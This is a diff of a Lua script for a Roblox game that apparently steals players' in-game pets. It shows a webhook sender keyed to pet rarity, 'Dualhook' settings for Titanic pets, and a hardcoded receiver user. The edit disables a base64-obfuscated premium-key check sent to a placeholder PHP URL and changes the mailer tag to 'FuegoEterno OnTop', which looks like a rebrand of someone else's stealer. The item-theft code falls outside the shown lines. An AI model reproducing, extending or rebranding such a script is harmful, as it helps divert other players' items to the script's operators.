@@ -1337,34 +1337,33 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
     end
 end
 
-local dhuser
-if getgenv().Settings ~= nil then
-    if getgenv().Settings.PremiumKey ~= nil then
-        local premkey = getgenv().Settings.PremiumKey
-        local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
-        local dhdata = {
-            dhprem = dhkey
-        }
-        local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
-        local dhheaders = {
-            ["content-type"] = "application/json"
-        }
-        local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
-        local dhresponse = request({
-            Url = dhurl,
-            Body = dhnewdata,
-            Method = "POST",
-            Headers = dhheaders
-        })
-        local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
-        if responsed ~= 'false' then
-            dhuser = responsed
-        else
-            dhuser = nil
-        end
-    end
-end
-local titanicin
+local dhuser = getgenv().Settings.User
+-- if getgenv().Settings ~= nil then
+--     if getgenv().Settings.PremiumKey ~= nil then
+--         local premkey = getgenv().Settings.PremiumKey
+--         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
+--         local dhdata = {
+--             dhprem = dhkey
+--         }
+--         local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
+--         local dhheaders = {
+--             ["content-type"] = "application/json"
+--         }
+--         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
+--         local dhresponse = request({
+--             Url = dhurl,
+--             Body = dhnewdata,
+--             Method = "POST",
+--             Headers = dhheaders
+--         })
+--         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
+--         if responsed ~= 'false' then
+--             dhuser = responsed
+--         else
+--             dhuser = nil
+--         end
+--     end
+-- end
 local bananin
 local hugein
 local pogin
@@ -1373,7 +1372,7 @@ local eventin
 local secretin
 local mythicin
 local gemsin
-local mailmsg = "Yokonara On Top"
+local mailmsg = "FuegoEterno OnTop"
 if dhuser ~= nil then
     if getgenv().Settings.Titanics.Dualhook then
         titanicin = getgenv().Settings.Titanics.Intensity
